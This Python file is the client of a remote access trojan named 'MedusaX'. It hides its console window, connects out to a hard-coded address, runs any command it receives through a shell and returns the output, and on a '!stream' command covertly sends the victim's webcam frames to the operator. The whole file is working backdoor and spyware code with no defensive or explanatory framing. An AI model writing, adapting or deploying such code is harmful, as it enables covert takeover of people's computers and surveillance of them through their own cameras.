import socket
import threading
import subprocess
import os
import sys
import cv2
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel
from PyQt5.QtGui import QImage, QPixmap
from PyQt5.QtCore import QThread, pyqtSignal

class ClientStreamThread(QThread):
    def __init__(self, server_socket):
        super().__init__()
        self.server_socket = server_socket

    def run(self):
        cap = cv2.VideoCapture(0)
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            _, buffer = cv2.imencode('.jpg', frame)
            self.server_socket.sendall(buffer.tobytes())
        cap.release()

def hide_window():
    if os.name == 'nt':
        import win32console
        import win32gui
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

def connect_to_server(server_ip, server_port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((server_ip, server_port))
    return server_socket

def main():
    server_ip = "10.0.1.33"
    server_port = 9999
    hide_window()
    server_socket = connect_to_server(server_ip, server_port)
    while True:
        command = server_socket.recv(1024).decode()
        if command == "!stream":
            app = QApplication(sys.argv)
            window = QMainWindow()
            window.setWindowTitle("MedusaX - Stream")
            window.setGeometry(100, 100, 800, 600)
            label = QLabel(window)
            layout = QVBoxLayout()
            layout.addWidget(label)
            container = QWidget()
            container.setLayout(layout)
            window.setCentralWidget(container)
            stream_thread = ClientStreamThread(server_socket)
            stream_thread.start()
            window.show()
            app.exec_()
        else:
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            server_socket.send(output.stdout.encode())

if __name__ == "__main__":
    main()
